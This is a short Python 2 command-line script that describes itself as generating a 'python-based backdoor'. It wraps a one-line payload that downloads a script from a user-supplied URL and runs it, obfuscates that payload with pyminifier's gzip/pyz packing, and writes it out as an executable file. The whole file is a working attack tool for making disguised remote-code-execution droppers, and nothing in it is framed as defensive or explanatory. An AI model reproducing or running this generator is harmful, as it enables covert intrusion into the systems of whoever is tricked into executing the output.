#!/usr/bin/env python
import argparse
import os
import stat

# Instantiate argument parser
parser = argparse.ArgumentParser(description='Generate a python-based backdoor that execute shell script in internet')
parser.add_argument('script_url', help='Remote script file url')
parser.add_argument('-o', help='Output file')
args = parser.parse_args()

# Raw Code
code = "exec(__import__('urllib2').urlopen('" + args.script_url + "').read())"

# Obsfuscate using pyminifier
def obsfuscate(code):
    with open('__tmp.o.py', 'w') as f:
        f.write(code)
    os.system('pyminifier --gzip --pyz=__tmp.o.pyz __tmp.o.py > /dev/null')
    with open('__tmp.o.pyz', 'r') as f:
        res = f.read()
    os.remove('__tmp.o.py')
    os.remove('__tmp.o.pyz')
    return res

obscode = obsfuscate(code)

# Write out result
if (args.o is None):
    print obsfuscate(code)
else:
    with open(args.o, 'w') as f:
        f.write(obscode)
    os.chmod(args.o, os.stat(args.o).st_mode | stat.S_IEXEC)
